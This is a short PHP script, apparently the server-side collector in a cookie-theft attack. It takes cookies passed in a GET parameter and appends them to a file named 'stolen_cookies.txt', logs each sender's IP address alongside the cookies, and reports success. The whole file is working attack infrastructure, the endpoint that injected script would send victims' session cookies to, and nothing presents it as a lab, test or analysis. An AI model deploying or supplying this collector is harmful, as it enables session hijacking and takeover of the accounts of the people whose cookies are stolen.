// collect-cookies.php
<?php
if (isset($_GET['cookies'])) {
    $cookies = $_GET['cookies'];
    // Log cookies to a file
    file_put_contents('stolen_cookies.txt', $cookies . "\n", FILE_APPEND);
    
    // Optionally, log IP address and other details for auditing
    $ip = $_SERVER['REMOTE_ADDR'];
    file_put_contents('access_logs.txt', "IP: $ip | Cookies: $cookies\n", FILE_APPEND);
    
    // Respond with a success message (optional)
    echo "Cookies successfully logged!";
} else {
    // Respond with an error message or handle the case where no cookies are sent
    echo "No cookies found in the request.";
}
?>
